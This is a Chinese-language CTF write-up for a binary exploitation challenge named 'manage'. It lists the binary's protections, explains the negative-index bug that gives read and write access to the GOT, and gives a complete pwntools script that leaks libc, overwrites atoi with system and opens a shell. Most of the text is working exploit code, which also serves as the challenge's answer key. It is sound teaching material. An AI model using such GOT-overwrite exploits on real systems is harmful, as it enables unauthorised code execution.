# manage 

> 题目可以在[Releases](https://github.com/RocketMaDev/CTFWriteup/releases/download/career/career.tar.zst)附件中找到

## 文件属性

|属性  |值    |
|------|------|
|Arch  |amd64 |
|RELRO |No    |
|Canary|on    |
|NX    |on    |
|PIE   |off   |
|strip |no    |
|libc  |2.31-0ubuntu9.16|

## 解题思路

程序看似是菜单题，实际上没有`malloc`和`free`函数，仔细看输入的索引，
以`int`存储，可以为负值。因此可以查看got表来得到libc并写入其他函数。
同时菜单选项是通过`atoi`来转换的，因此把`atoi`写为`system`就可以方便地打开shell

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './manage'

def payload(lo:int):
    global sh
    if lo:
        sh = process(EXE)
        if lo & 2:
            gdb.attach(sh)
        libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.31-0ubuntu9.15_amd64/libc.so.6')
    else:
        sh = remote('10.10.26.199', 24361)
        libc = ELF('./libc-2.31.so')
    elf = ELF(EXE)

    def show(idx: int) -> bytes:
        sh.sendlineafter(b'system---', b'2')
        sh.sendlineafter(b'index', str(idx).encode())
        sh.recvuntil(b':\n')
        return sh.recvuntil(b'---Welcome')

    def edit(idx: int, buf1: bytes, buf2: bytes):
        sh.sendlineafter(b'system---', b'3')
        sh.sendlineafter(b'index', str(idx).encode())
        sh.sendlineafter(b'card', buf1)
        sh.sendlineafter(b'name', buf2)

    leak1 = show(-1)
    idx = leak1.find(b': ') + 2
    libcBase = u64(leak1[idx:idx + 6] + b'\0\0') - libc.symbols['_IO_2_1_stderr_']
    success(GOLD_TEXT(f'Leak libcBase: {libcBase:#x}'))
    libc.address = libcBase

    edit(-3, p64(libc.symbols['puts']), p64(0) + p64(libc.symbols['system']))

    sh.sendafter(b'system---', b'/bin/sh\0')

    sh.clean()
    sh.interactive()
    sh.close()
```

